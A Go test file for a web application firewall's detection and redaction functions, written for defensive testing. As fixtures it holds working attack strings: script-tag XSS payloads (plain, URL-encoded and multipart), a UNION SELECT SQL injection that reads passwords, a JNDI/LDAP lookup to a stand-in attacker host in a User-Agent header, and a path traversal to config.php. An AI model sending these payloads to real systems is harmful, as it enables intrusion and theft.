package waf

import (
	"bytes"
	"mime/multipart"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestDescribeBlockQueryXSS(t *testing.T) {
	r := httptest.NewRequest("GET", "/search?q=<script>alert(1)</script>", nil)

	malicious, details, rule := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected XSS to be detected")
	}

	det := DescribeBlock(r, nil, details, rule)
	if det.Category != "XSS" {
		t.Fatalf("expected category XSS, got %q (details=%q)", det.Category, details)
	}
	if det.Location != "Query" {
		t.Fatalf("expected location Query, got %q", det.Location)
	}
	if det.Rule != rule || det.Rule == "" {
		t.Fatalf("expected rule to be preserved, got %q want %q", det.Rule, rule)
	}
	if !strings.Contains(det.Payload, "script") {
		t.Fatalf("expected payload to contain the attack, got %q", det.Payload)
	}
	if len(det.Variants) == 0 {
		t.Fatalf("expected at least one variant")
	}
}

func TestDescribeBlockEncodedQueryProducesVariants(t *testing.T) {
	r := httptest.NewRequest("GET", "/search?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B", nil)

	malicious, details, rule := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected encoded XSS to be detected")
	}

	det := DescribeBlock(r, nil, details, rule)
	if det.Category != "XSS" {
		t.Fatalf("expected category XSS, got %q", det.Category)
	}
	// O payload bruto vem codificado; as variantes devem revelar a forma decodificada.
	decodedFound := false
	for _, v := range det.Variants {
		if strings.Contains(strings.ToLower(v), "<script") {
			decodedFound = true
			break
		}
	}
	if !decodedFound {
		t.Fatalf("expected a decoded variant exposing <script, got %#v", det.Variants)
	}
}

func TestDescribeBlockBodySQLi(t *testing.T) {
	body := []byte("id=1 UNION SELECT password FROM users")
	r := httptest.NewRequest("POST", "/items", bytes.NewReader(body))

	malicious, details, rule := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected SQLi to be detected")
	}

	det := DescribeBlock(r, body, details, rule)
	if det.Category != "SQLi" {
		t.Fatalf("expected category SQLi, got %q", det.Category)
	}
	if det.Location != "Body" {
		t.Fatalf("expected location Body, got %q", det.Location)
	}
	if !strings.Contains(det.Payload, "UNION") {
		t.Fatalf("expected payload to carry the body, got %q", det.Payload)
	}
}

func TestDescribeBlockHeaderJNDI(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("User-Agent", "${jndi:ldap://attacker.local/a}")

	malicious, details, rule := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected JNDI header to be detected")
	}

	det := DescribeBlock(r, nil, details, rule)
	if det.Category != "JNDI" {
		t.Fatalf("expected category JNDI, got %q", det.Category)
	}
	if !strings.HasPrefix(det.Location, "Header ") {
		t.Fatalf("expected header location, got %q", det.Location)
	}
	if !strings.Contains(det.Payload, "jndi") {
		t.Fatalf("expected payload to contain header value, got %q", det.Payload)
	}
}

func TestDescribeBlockPathTraversal(t *testing.T) {
	r := httptest.NewRequest("GET", "/files/../config.php", nil)

	malicious, details, rule := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected traversal to be detected")
	}

	det := DescribeBlock(r, nil, details, rule)
	if det.Category != "PATH_TRAVERSAL" {
		t.Fatalf("expected PATH_TRAVERSAL, got %q", det.Category)
	}
	if det.Location != "Path" {
		t.Fatalf("expected location Path, got %q", det.Location)
	}
	if det.Payload == "" {
		t.Fatalf("expected non-empty path payload")
	}
}

func TestDescribeBlockMultipart(t *testing.T) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	field, err := writer.CreateFormField("comment")
	if err != nil {
		t.Fatalf("multipart field: %v", err)
	}
	if _, err := field.Write([]byte("<script>alert(1)</script>")); err != nil {
		t.Fatalf("multipart write: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("multipart close: %v", err)
	}

	r := httptest.NewRequest("POST", "/upload", nil)
	r.Header.Set("Content-Type", writer.FormDataContentType())

	malicious, details, rule := CheckRequest(r, body.Bytes())
	if !malicious {
		t.Fatalf("expected multipart XSS to be detected")
	}

	det := DescribeBlock(r, body.Bytes(), details, rule)
	if det.Category != "XSS" {
		t.Fatalf("expected XSS, got %q", det.Category)
	}
	if !strings.HasPrefix(det.Location, "Multipart") {
		t.Fatalf("expected multipart location, got %q", det.Location)
	}
	if !strings.Contains(det.Payload, "script") {
		t.Fatalf("expected payload extracted from the multipart part, got %q", det.Payload)
	}
}

func TestSplitDetails(t *testing.T) {
	cases := []struct {
		in       string
		category string
		location string
	}{
		{"XSS in Query", "XSS", "Query"},
		{"SQLi in Header User-Agent", "SQLi", "Header User-Agent"},
		{"XSS in Multipart Body", "XSS", "Multipart Body"},
		{"MALFORMED_MULTIPART", "MALFORMED_MULTIPART", ""},
	}
	for _, c := range cases {
		category, location := splitDetails(c.in)
		if category != c.category || location != c.location {
			t.Fatalf("splitDetails(%q) = (%q,%q), want (%q,%q)", c.in, category, location, c.category, c.location)
		}
	}
}

func TestRedactDetectionRemovesCredentials(t *testing.T) {
	detection := Detection{
		Location: "Body",
		Payload:  `{"username":"alice","password":"correct horse","token":"secret-token"}`,
		Variants: []string{`password=hunter2&note=ok`},
	}

	redacted := RedactDetection(detection)
	if strings.Contains(redacted.Payload, "correct horse") || strings.Contains(redacted.Payload, "secret-token") {
		t.Fatalf("credentials remained in redacted payload: %q", redacted.Payload)
	}
	if strings.Contains(redacted.Variants[0], "hunter2") {
		t.Fatalf("credential remained in redacted variant: %q", redacted.Variants[0])
	}
}

func TestRedactDetectionRemovesAuthorizationHeader(t *testing.T) {
	redacted := RedactDetection(Detection{
		Location: "Header Authorization",
		Payload:  "Bearer top-secret-token",
		Variants: []string{"Bearer top-secret-token"},
	})
	if redacted.Payload != "[REDACTED]" || len(redacted.Variants) != 0 {
		t.Fatalf("expected full header redaction, got %+v", redacted)
	}
}
